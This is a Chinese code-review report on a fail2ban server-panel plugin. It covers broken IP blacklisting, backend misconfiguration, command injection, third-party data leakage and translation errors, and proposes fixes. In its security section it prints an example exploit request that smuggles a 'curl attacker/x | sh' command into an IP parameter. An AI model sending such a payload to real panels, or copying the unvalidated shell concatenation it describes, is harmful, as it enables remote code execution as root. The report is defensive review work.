# fail2ban 插件优化分析报告

- 分析对象：`plugins/fail2ban/`（优化前：index.py 1454 行 / fail2ban.js 850 行 / install.sh 94 行；优化后：index.py 2073 行 / fail2ban.js 912 行 / install.sh 219 行 / lang ×6 各 155 键）
- 分析维度：可靠性、安全性、多语言适配性、执行性能
- 版本：`info.json` versions = `["1.2.0"]`
- 结论：**需要优化，且存在 3 个 P0 级缺陷（功能失效 1 个、可提权 1 个、静默失效 1 个）**

## 二、可靠性

### 2.1【P0】手动 IP 黑名单根本没有下发到 fail2ban

```python
# index.py:516
data = _read_conf(getConfigFile())      # config.json = {"server":[...],"site":[...],"strict":true}
...
for d in data:                          # ← 遍历的是字典键：'server' / 'site' / 'strict'
    for ip in add_ip_list:
        yf.execShell('fail2ban-client -vvv set {jail} banip {ip}'.format(jail=d, ip=ip))
```

`data` 是 `get_anti_info()` 写出的 **dict**（`server`/`site`/`strict`），`for d in data` 取到的是**键名**而不是 jail 名，实际执行的是：

```
fail2ban-client -vvv set server banip 1.2.3.4     # jail "server" 不存在 → 必然失败
```

且 `execShell` 的返回值被丢弃，失败无人知晓。更糟的是 `get_active_bans()` 会**把失败伪装成成功**：

```python
# index.py:584-587
if bantime < 0 or expire_time > now or ip in black_list:
    if ip in black_list:
        bantime = -1        # ← 只要在 black_list 里就强制显示"永久封禁"
```

**净效果**：管理员在"IP黑名单"里添加的 IP，界面上显示"永久封禁"，实际 fail2ban 从未封禁它。解除分支（518-525）有同样的遍历 bug。

**修复**：从配置里取真实 jail 名，并检查命令返回：

```python
def _get_jails(conf):
    jails = []
    for item in conf.get('server', []) + conf.get('site', []):
        if str(item.get('act')).lower() == 'true':
            jails.append(item['mode'])
    return jails

jails = _get_jails(data)
for jail in jails:
    out, err = yf.execShell('fail2ban-client set %s banip %s' % (jail, ip))
    if err or 'error' in out.lower():
        return yf.returnJson(False, '封禁失败(%s): %s' % (jail, err or out))
```

同时 `get_active_bans` 不应再用 `black_list` 强制改写 `bantime`，应直接读 DB 真实状态。

### 2.2【P0】`[DEFAULT] backend = systemd` 污染 mysql/redis jail

```python
# index.py:848-850
content = "[DEFAULT]\n"
content += f"backend = {ssh_backend}\n"     # ← 无 auth.log/secure 时 = "systemd"
```

Debian 12 / Ubuntu 22.04+ / RHEL 9+ 上 `/var/log/auth.log`、`/var/log/secure` 往往不存在，`getSshLogConfig()` 返回 `('systemd', None)`，于是 **DEFAULT 段**被写成 `backend = systemd`。而 server 循环里只有 `sshd` 分支会显式覆写 backend：

```python
elif mode == 'mysql':
    content += "logpath = /www/server/data/*.err\n"   # ← 没有 backend = auto
elif mode == 'redis':
    content += "logpath = /var/log/redis/*.log\n"     # ← 没有 backend = auto
```

systemd 后端会**忽略 logpath**，于是 MySQL / Redis 防爆破读的是 journal 而非错误日志 → 规则永不命中，界面却显示"防御中"。站点分支因为写了 `backend = auto` 才侥幸正常。

**修复**：`backend` 必须逐 jail 设置，不要放 DEFAULT：

```python
content = "[DEFAULT]\nallowipv6 = auto\n\n"
...
# mysql
content += "backend = auto\nlogpath = /www/server/data/*.err\n"
# redis
content += "backend = auto\nlogpath = /var/log/redis/*.log\n"
```

### 2.3【P1】`checkEnv()` 可能删掉正在运行服务的 socket

```python
# index.py:95-102
res = yf.execShell('fail2ban-client ping')
if 'pong' not in res[0]:
    is_active = yf.execShell('systemctl is-active fail2ban')[0].strip()
    if is_active != 'active':
        os.remove(sock_file); os.remove(pid_file)
```

两个风险：
1. **启动竞态**：`fail2ban-client ping` 在服务启动的头 1~2 秒内不返回 pong，此时若 `systemctl is-active` 恰好是 `activating`（不是 `active`），就会删掉活着的 socket。
2. **非 systemd 环境**（容器、Alpine、Devuan）：`systemctl` 不存在 → 返回非 `active` → 判定为"未运行" → 删掉真正在跑的 socket。整个插件此时已不可用。

**修复**：只把 `inactive`/`failed` 视为可清理，并加超时保护：

```python
if is_active in ('inactive', 'failed') and not os.path.exists('/run/systemd/system'):
    ...
```

### 2.4【P1】启动探测固定 0.8s，慢机器误报"启动失败"

```python
# index.py:369-382
if method in ['start', 'restart']:
    time.sleep(0.8)
    current_st = status()
    if current_st == 'start':
        return 'ok'
    diag = yf.execShell('journalctl -u fail2ban -n 20 --no-pager')
    ...
    return f"fail: 服务启动失败，检测到进程异常退出。\n[诊断日志]\n{err_msg}"
```

内存小 / 日志量大的机器，fail2ban 初始化 jail 可能 3~10s。0.8s 探测必然失败，还会把 20 行 journal 原文塞给前端。

**修复**：指数退避轮询（0.5s → 1s → 2s → 4s，总计约 10s）后再判定；`err_msg` 只取最后 3 行并做长度截断。

### 2.5【P1】首页插件卡片点击失效

```python
# index.py:1335-1341
version = vdata.get('versions', "1.0")     # info.json 里是 list → ["1.2.0"]
res = {"count": count_str, "ver": version}
```

`index.js:1351` 把 `ver` 直接拼进 onclick：

```js
onclick="' + onclick_str + '"     // → onclick="softMain('fail2ban','御风F2B底层防火墙','["1.2.0"]')"
```

`["1.2.0"]` 里的双引号会**提前闭合 HTML 属性**，首次渲染（无 localStorage 缓存）时该卡片点击无响应。

**修复**：`version = vdata.get('versions', ['1.0']); version = version[-1] if isinstance(version, list) else version`。

### 2.6【P1】非 Linux 分支实际不可用

```python
# index.py:312-337
def initDreplace():
    file_tpl = getInitDTpl()                  # /init.d/fail2ban.tpl —— 该文件不存在
    ...
    file_bin = initD_path + '/' + getPluginName()
    ...
    return file_bin                           # ← 从未写入 file_bin！
```

`initDreplace()` 只创建目录、从不落盘脚本，因此：
- darwin 分支 `yf.execShell(file + ' ' + method)`（354）执行的是不存在的文件；
- freebsd 分支 `shutil.copyfile(source_bin, initd_bin)`（434）源文件不存在 → 抛异常。

**建议**：要么补齐 init.d 模板并真正写入，要么明确删除 darwin/freebsd 分支（`info.json` 也未声明支持这两个系统），避免"看起来支持、跑起来就挂"。

### 2.7【P1】指标口径失真

`initConfigFiles()` 生成的 `fail2ban.conf` 里 `dbpurgeage = 1d`，`bans` 表只保留 **1 天**。但：

```python
# index.py:1282-1302
c.execute("SELECT count(*) FROM bans")            # → "总拦截"，实际只有近 1 天
c.execute("SELECT min(timeofban) FROM bans")      # → "安全防护(天)"，实际 ≤1
```

`get_logs_list` 的 `l7` / `l30` 同样只读 `/var/log/fail2ban.log`（不含 `.1`、`.gz`），日志轮转后必然缺数据。

**修复**：总拦截改为读 `fail2ban-client status <jail>` 的 `Total banned`，或独立维护计数器；防护天数用 `/etc/fail2ban/jail.local` 的 ctime（代码里已有这个兜底逻辑，只是被 DB 分支抢占了）；`l7/l30` 遍历 `fail2ban.log*`。

### 2.8【P1】直连 SQLite 删行与 fail2ban-server 抢写

```python
# index.py:606-631
conn = sqlite3.connect(db_path)
c.execute("DELETE FROM bans WHERE ip = ? AND jail = ?", (ip, jail))
conn.commit()
```

fail2ban-server 自己持有该库。外部进程无 `busy_timeout` 直接写，容易 `database is locked`；且绕过 fail2ban 内存态，重启时 `Restore Ban` 可能把刚删的封禁写回，造成 UI 与真实状态不一致。

**修复**：以 `fail2ban-client set <jail> unbanip <ip>` 为唯一入口（成功后 fail2ban 自己会同步 DB），删除这段直连写库逻辑。

### 2.9【P2】install.sh 健壮性

- 无 `set -e`；`apt install` 失败仍打印"安装fail2ban完成"并继续启动。
- 未安装 `iptables` / `ipset`（最小化 Debian 上 `iptables-allports` 动作会失败）。
- 卸载 `rm -rf /etc/fail2ban` 会连用户自定义 `filter.d/*.conf`、`jail.d/*.conf` 一并删除；且残留 `/var/lib/fail2ban`、`/run/fail2ban`、`/var/log/fail2ban.log`。
- 只覆盖 `apt` / `yum`，不支持 `pacman`（Arch）、`apk`（Alpine）。
- `which yum && yum purge -y fail2ban`（57）：`yum` 无 `purge` 子命令，这行是死代码。

## 三、安全性

### 3.1【P0】命令注入

`web/core/yf.py:141-150` 的 `execShell` 是 `shell=True`，而 `sanitizeCmdScripts()`（104-139）**只做 CRLF 清洗，不过滤任何 shell 元字符**。插件里有 3 条未校验入参的拼接路径：

| 入口 | 代码 | 入参来源 |
|---|---|---|
| `unban_active_ip()` | `'fail2ban-client -vvv set {jail} unbanip {ip}'.format(...)` (642/645) | `args['ip']`、`args['jail']` **完全未校验** |
| `set_anti()` / `del_anti()` | `mode` 写入 config.json → jail.local，并被 `setBlackIp` 拼入 shell (930-991) | `args['mode']` **无白名单** |
| `setBlackIp()` | 遍历分支拼接 jail 名 (521/540/545) | 间接来自 `mode` |

`web/utils/plugin.py:1573` 只对 `name`/`script`/`func` 做正则白名单，**args 里的值原样透传**。面板以 root 运行，因此一个已登录的面板用户即可：

```
POST /plugins/callback
name=fail2ban&func=unban_active_ip&args={"ip":"1.1.1.1; curl attacker/x | sh","jail":"sshd"}
```

**修复**（三层）：
1. 加统一校验函数，IP 用 `ipaddress.ip_address()` 或现有正则，jail 名走白名单 `{'sshd','ftpd','mysql','dovecot','postfix','redis','global-cc','global-scan'}`；
2. `execShell(cmd, shell=False)` + 参数列表，从根上消除注入；
3. `set_anti` 对 `port`/`maxretry`/`findtime`/`bantime` 强制 `int()` 与范围校验（当前是直接字符串写入 jail.local，可注入配置行）。

```python
def _safe_ip(ip):
    ip = (ip or '').strip()
    try:
        ipaddress.ip_address(ip)
        return ip
    except ValueError:
        return None

ALLOWED_MODES = {'sshd','ftpd','mysql','dovecot','postfix','redis','global-cc','global-scan'}
```

> 注：`index.py:1` 已经 `import ipaddress` 却从未使用 —— 现成的工具就在手边。

### 3.2 第三方外发与明文传输

```python
# index.py:1066 / 1092
req = urllib.request.Request('http://ip-api.com/batch?lang=zh-CN')
url = 'http://ip-api.com/json/' + ip + '?lang=zh-CN'
```

- 走 **HTTP 明文**，归属地结果可被中间人篡改；
- 把**全部被封 IP 批量外发**给第三方，属数据外泄（且服务器需有出网权限）；
- `lang=zh-CN` 硬编码，与面板语言无关（见第四章）；
- `ip` 未校验即拼 URL，可注入路径/查询串（危害有限，但应一并修）。

**修复**：改 `https://`、把 `lang` 与当前语言联动、加"归属地查询"开关（默认关或首次提示）、服务端缓存 24h。

### 3.3 其他

- `get_ip_logs()` 失败时把整个 args 回显：`f'IP不能为空! args dump: {str(args)}'`（1232）——内部结构泄露，应移除。
- ~~遗留文件 `js/fail2ban.js.i18n.bak` 属不该上线的中间产物~~ **【复核后更正】**：经全库核查，`js/*.i18n.bak` 是项目级约定——20+ 个插件各有一份，且在 `e5cd1211d「插件翻译补全」` 提交中统一入库，作为 i18n 改造前的回滚快照，**属有意保留，不应删除**。
- `__pycache__/`（cpython-310 / 313 / 314 的 .pyc）虽已被 `.gitignore` 忽略，但 `scripts/plugin_compress.sh` 使用 `zip -r ./*` 打包，会把 `.pyc` 一并打进插件包，建议在打包脚本中排除。
- 权限粒度：`callback` 仅校验"已登录"，未做按插件/按操作的功能级鉴权。`clear_log`、`set_black_ip` 等破坏性操作对任意登录用户开放（属面板通用设计问题，此处仅记录）。

## 四、多语言适配性

### 4.1 基础面：良好

- 六语（zh-CN / zh-TW / en / de / fr / it）键集合**完全对齐**：各 155 键，0 缺失、0 多余、0 空值。
- **HTML 硬约束通过**：六语共 930 条译文，0 条含 HTML，符合 `web/core/i18n.py:assert_no_html_in_translations()`。
- 106 个 `pt()` 字面量中，仅 1 个缺键。

### 4.2【P1】JS 中 30+ 处中文未包 `pt()`

| 位置 | 漏出内容 |
|---|---|
| `fail2ban.js:294,296` | 剩余封禁时间 `小时` / `分钟`（**最常被用户看到的漏出**） |
| `:449,450,558,559` | 系统/网站防护表格里的 `次 / `、`秒` |
| `:338` / `:343` | `未知` / `局域网/保留地址` |
| `:185` | `暂无日志数据` |
| `:96` | 严格模式复选框 label `严格模式` |
| `:577-590` | 整段"网站防护机制深度解析"及 `全局防 CC 攻击`、`全局防恶意扫描` |
| `:731` / `:786` / `:795` | `【】触发详情` / CSV 表头 / `防护历史.csv` |

其中 `网站防护机制深度解析` 是**唯一不在任何语言包里的键**。

### 4.3【P1】后端返回的中文 reason 不会被翻译

`get_logs_list()` 返回的 `reason`（`触发防御规则，已被自动拦截`、`请求频率过高，触发CC防御拦截` …，index.py:1139-1151）在语言包里都有对应键，但翻译机制是"**弹窗打开时扫一次 DOM**"：

```js
// web/static/app/soft.js:48-52
success: function (layero, index) {
  window.YfI18n.translatePluginDOM(layero, name);   // ← 只在这里执行一次
}
```

`f2bLogRequest()` 是 ajax 二次渲染，之后不会重跑翻译 → **en/de/fr/it 下"防护历史"的"原因"列恒为中文**。同理 `index.html` 的 9 个菜单项也依赖这一次翻译，能用但脆弱。

**修复**：`reason` 改由前端用 `pt()` 映射（后端只返回规则标识符，如 `reason_code: 'cc'`），或渲染后主动调一次 `translatePluginDOM($('#ws_table'))`。

### 4.4【P1】碎片拼接导致外语语义破碎

```js
// fail2ban.js:356
layer.confirm(pt('确定要解除对 IP') + ' (' + ip + ') ' + pt('的封禁吗？'), ...)
```

| 语言 | 实际渲染结果 |
|---|---|
| en | Are you sure you want to lift the restriction on IP (1.1.1.1) **Is this a ban?** |
| de | Bestätigen Sie, dass Sie die Sperre für die IP-Adresse aufheben möchten (1.1.1.1) **Die Sperre?** |
| fr | Confirmez-vous ... l'adresse IP (1.1.1.1) **La suspension ?** |
| it | Conferma la rimozione del blocco dell'IP (1.1.1.1) **Il blocco?** |

语言包里其实**已经有**正确的单键 `确定要解封 IP ({1}) 吗？`，却没用上。

**修复**：改用插值单键 `pt('确定要解封 IP ({1}) 吗？', ip)`（`createPluginTranslator` 已支持 `{1}` 插值）。

同类问题：`pt('参数:(') + ck[i] + pt(')没有!')`（index.py:227）、`pt('次 /')`。

### 4.5【P1】译文质量

- **en**：`次 /` → `Second-rate /`（"次品/"，完全错误）；`FTP 防爆破` → `FTP explosion-proof`；`防暴破拦截` → `riot prevention and interception`（"防暴乱"）；`自启动` → `self start`；`清空日志` → `ClearLogs`（缺空格）；`IP归属` → `IP Address Assignment`（应为 IP location）。
- **fr**：`参数:(` → **`Nom de domaine du serveur`**（"服务器域名"，整句错译，疑似串包）。
- **it**：`次` → `Di second'ordine`；`次 /` → `Volta /`；`自启动` → `Dall'avvio`。
- **de**：`自启动` → `Seit dem Start`（"自启动以来"，语义反了）；`清空日志` → `LeerenProtokolle`。
- **zh-TW 简体残留 5 处**：`状态`（应 `狀態`）、`设置成功!`（`設定成功！`）、`正在获取日志...`（`正在取得日誌...`）、`越权路径读取被拒绝`（`越權路徑讀取被拒絕`）、`衢州禦風科技有限公司`（**`禦` 是错字**，御风应为 `御風`）。

### 4.6 死键（永不命中）

| 键 | 原因 |
|---|---|
| `'\\uFEFF时间,IP,规则名,原因\\n'` | JSON 里是**字面反斜杠**，JS 里是真实 BOM+换行，永不匹配（且 CSV 表头本来也没走 `pt()`） |
| `'IP不能为空! args dump: {str(args)}'` | 后端会把 `{str(args)}` 替换成真实 dict，键不可能相等 |
| `')没有!'` / `'参数:('` | 后端是拼接片段，翻译即使命中也会切碎句子 |

### 4.7 其他

- 语言包缺 `网站防护机制深度解析`；建议统一补键并把 `:577-590` 整段纳入 `pt()`。
- 单位首字母大小写不统一（en：`Second` / `Hours` / `times` 混用）。
- `getIpLocation` 的 `lang=zh-CN` 硬编码 → 非中文面板下归属地仍返回中文。
